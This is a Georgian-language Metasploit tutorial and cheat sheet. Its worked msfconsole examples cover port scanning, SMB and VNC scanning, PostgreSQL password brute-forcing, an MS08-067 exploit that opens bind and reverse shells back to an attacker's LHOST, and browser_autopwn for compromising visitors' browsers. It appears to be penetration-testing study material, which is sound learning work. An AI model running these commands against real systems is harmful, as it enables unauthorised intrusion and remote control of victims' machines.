# მარტივი ეტაპები Metasploit-ის გამოსაყენებლად

  - შეარჩიე ექსპლოიტი რომელსაც გამოიყენებ
  - დააკონფიგურე ექსპლოიტი მსხვერპლის IP მისამართის მითითებით და პორტის ნომერით
  - აირჩიე payload-ი
  - დააკონფიგურე payload-ი ლოკალური IP მისამართის მითითებით და პორტის ნომერით
  - შეამოწმე / გაუშვი ექსპლოიტი

# msfconsole

```
tutashxia@kali ~> msfconsole 
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v4.17.3-dev                          ]
+ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > 
```

ხედავთ რომ გვიჩვენებს 1795 exploits, 1019 auxiliary, 310 post, 538 payloads, 41 encoders, 10 nops.
  * exploits რათქმაუნდა ექსპლოიტებია
  * auxiliary წარმოადგენს სხვადასხვა დამატებით ხელსაწყოებს სკანირევისთვის
  * payloads არის მარგი ტვირთი რომელიც ექსპლოიტის მიერ გაიშვება
  * encoders გეხმარებათ ანტივირუსების, ფაირვოლების, IDS და IPS-ების გადალახვას მარგი ტვირთვის ენკოდირებით
  * nops (No Operation ან No Operation Performed) ეს არის ასემბლერის ინსტრუქცია რომელიც ხშირადაა გამოყენებული შელკოდებში.


არსებული მოდულების სანახავად:
```
msf > show -h
```

  * **show auxiliary**
  * **show exploits**
  * **show payloads**
  * **show encoders**
  * **shownops**
  * **show options**: გაჩვენებთ პარამეტრებს, მოდულის გამოსაყენებლად.
  * **show targets**: გაჩვენებთ მოდულის მიერ მხარდაჭერის ოპერაციულ სისტემებს.
  * **show advanced**: გაჩვენებთ დამატებით პარამეტრებს.

| ბრძანება                     | ახსნა 							|
| **check**                    | ამოწმებს ექსპლოიტის ფუნქციონირებას სამიზნის წინააღმდეგ ექსპლუატაციის გარეშე, რადგან დაადგინოს იგი გამოდგება თუ არა. ბევრ ექსპლოიტს ეს ფუნქცია არ გააჩნია. |
| **connectip** port           | netcat-ს და telnet-ის მსგავსია                      |
| **exploit**                  | შერჩეული ექსპლოიტის გაშვება                         |
| **run**                      | შერჩეული auxiliary-ის გაშვება                       |
| **jobs**                     | აჩვენებს უკანა პლანზე მომუშავე მოდულებს და გაძლევთ საშუალებას რომ ისინი გამორთოთ        |
| **route** add subnet netmasksessionid | გზის დამატება გატეხილი სისტემის გავლით, network pivoting |
| **info** module              | ინფორმაცია მოდულის შესახებ                           |
| **setparam** value           | მოდულის პარამეტრის გამოყენება                        |
| **setgparam** value          | პარამეტრის გამოყენება გლობალურად, ყოველივე მოდულისთვის       |
| **unsetparam**               | შლის მოდულის პარამეტრის მონაცემს                     |
| **unsetgparam**              | გლობალურად შლის პარამეტრის მონაცემს                  |
| **sessions**                 | სესიების მართვ: -l (listing, სია), -i ID (ინტერაქციისთვის), -k ID (kill, გამორთვა)|
| **search** string            | ძიება მოდულების სახელების სიაში და აღწერებში         |
| **use** module               | მოდულის ხმარება                                      |

## მაგალითი 1: პორტ სკანირება

```
tutashxia@kali ~> msfconsole 
msf > load db_tracker
msf > db_nmap -T Aggressive -sV -n -O -v 192.168.0.9
```

არმოჩენილი ღია პორტები სესიაშია შენახული რაც საშუალებას გაძლევთ რომ //db_hosts// და //db_services// ბრძანება გამოიყენოთ.

## მაგალითი 2: SMB-ს მომხმარებლები

```
tutashxia@kali ~> msfconsole 
msf > search SMB
msf > use auxiliary/scanner/smb/smb_enumershares
msf auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.0.1/24
msf auxiliary(scanner/smb/smb_enumshares) > run
```

## მაგალითი 3: სკანერი VNC ცარიელი აუთინთერობით

```
tutashxia@kali ~> msfconsole 
msf > use auxiliary/scanner/vnc/vnc_none_auth
msf auxiliary(scanner/vnc/vnc_none_auth) > show options

Module options (auxiliary/scanner/vnc/vnc_none_auth):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    5900             yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf auxiliary(scanner/vnc/vnc_none_auth) > set RHOSTS 10.4.124.0/24
RHOSTS => 10.4.124.0/24
msf auxiliary(scanner/vnc/vnc_none_auth) > run
```


## მაგალითი 4: PostgreSQL-ში აუთენთირება

```
tutashxia@kali ~> msfconsole
msf > use auxiliary/scanner/postgres/postgres_login
```

რომ გააგრძელოს ბრუტფორსი იმ შემთხვევაში თუ უკვე დაასკვნა მომხმარებელი და პაროლი.
```
msf auxiliary(postgres_login) > set STOP_ON_SUCCESS false
```

```
msf auxiliary(postgres_login) > set RHOSTS 192.168.0.9
msf auxiliary(postgres_login) > run
```

## მაგალითი 5: Bind shell

Bind shell-ი მარგი ტვირთვია რომელიც გატეხილ სისტემაში უშვებს შელს და შენთვსი ხელმისაწვდომად აქცევს მას ქსელური კავშირის დამყარებით. იგი აგრეთვე გამოიყენება იმ შემთხვევაში თუ ჰაკერი Network Address Translation (NAT) ან ფაორვოლის უკანაა და პირდამირი კავშირი ჰაკერთან და გატეხილ სისტემასთან ვერ დგება.

```
tutashxia@kali ~> msfconsole
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > show options
msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
RHOST => 192.168.0.7
msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/bind_tcp
PAYLOAD => windows/shell/bind_tcp
msf exploit(ms08_067_netapi) > exploit
```

## მაგალითი 6: Reverse shell

Reverse shell-ი bind shell-ის პირიქითაა. იმის მაგივრად რომ გატეხილ სისტემაში გახსნას პორტი და კავშირის დამყარებას ელოდოს ჰაკერისგან იგი პირდაპირ ჰაკერის სისტემას უკავშირება აიპი და პორტის მეშვეობით, და უშვებს შელს. ესეთი სცენარი საინტერესოა თუ მსხვერპლი NAT ან firewall უკანაა და სხების მიერ დაკავშირებას კრძალავს.

```
tutashxia@kali ~> msfconsole
msf> use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 192.168.0.7
RHOST => 192.168.0.7
msf exploit(ms08_067_netapi) > set PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf exploit(ms08_067_netapi) > show options
msf exploit(ms08_067_netapi) > set LHOST 192.168.0.3
LHOST => 192.168.0.3
msf exploit(ms08_067_netapi) > exploit
```

Reverse shell-ის შემთვევაში ჰაკერის აიპის მითითება საჭიროა (LHOST), bind shell-ის განსხვავებით.


## მაგალითი 7: ბრაუზერის ავტომატური ექსპლუატაცია

ეს უფრო მიზანმიმართულია სოციალური ინჟინერიის პროცესისთვის, ანუ პიროვნების ბრაუზერის გასატეხად.

```
tutashxia@kali ~> msfconsole
msf > use auxiliary/server/browser_autopwn
msf auxiliary(server/browser_autopwn) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf auxiliary(server/browser_autopwn) > set SRVPORT 80
SRVPORT => 80
msf auxiliary(server/browser_autopwn) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf auxiliary(server/browser_autopwn) > set URIPATH /
URIPATH => /
msf auxiliary(server/browser_autopwn) > run
```

როცა მსხვერპლი საიტზე შემოვა, მისი ბრაუზერი დაფიქსირდება და ექსპლუატაციის პროცესი განხორციელდება.

ნახეთ სესიების სია, და ნახავთ გატეხილ ბრაუზერს, შემდეგ ბრაზერთან ინტერაქციისთვის შეარჩიეთ სესუა, თუ იგი პირველია მაშინ sessions -i 1.
```
msf auxiliary(server/browser_autopwn) > sessions
```

# მარტივი ეტაპები Metasploit-ის გამოყენებისთვის

  - შეარჩიე ექსპლოიტი რომელსაც გამოიყენებ
  - დააკონფიგურე ექსპლოიტი მსხვერპლის IP მისამართის მითითებით და პორტის ნომერით
  - აირჩიე payload-ი
  - დააკონფიგურე payload-ი ლოკალური IP მისამართის მითითებით და პორტის ნომერით
  - შეამოწმე / გაუშვი ექსპლოიტი

| ეტაპი  | ბრძანება                   | ახსნა განმარტება                                       |
| 1      | show exploits              | ექსპლოიტების სიის ჩვენება                              |
| 2      | use [exploit name]         | ექსპლოიტის შერჩევა                                     |
| 3      | show payloads              | payload-ების ჩვენება                                   |
| 4      | set PAYLOAD [payload name] | payload-ის კონფიგურირება                               |
| 5      | show options               | პარამეტრების ჩვენება რომლების კონფიგურირება შესაძლოა   |
| 6      | check                      | აზუსტებს მსხვერპლის ექსპლუატაცია შესაძლოა თუ არა       |
| 7      | exploit                    | მსხვერპლის ექსპლუატაციას ახორციელებს                   |


# ტრიუკები

მხოლოდ Mac OS X-ის ექსპლოიტების ძებნა:
```
./msfcli | grep osx/
```

მხოლოდ ვინდოუსის ვებ ბრაუზერების ექსპლოიტების ძებნა:
```
./msfcli | grep windows/browser/
```

ექსპლოიტების ხელახლა ჩატვირთვა:
```
rexploit
```

ინფორმაცია სპეციფიკურ ექსპლოიტის შესახებ:
```
info exploit name
```
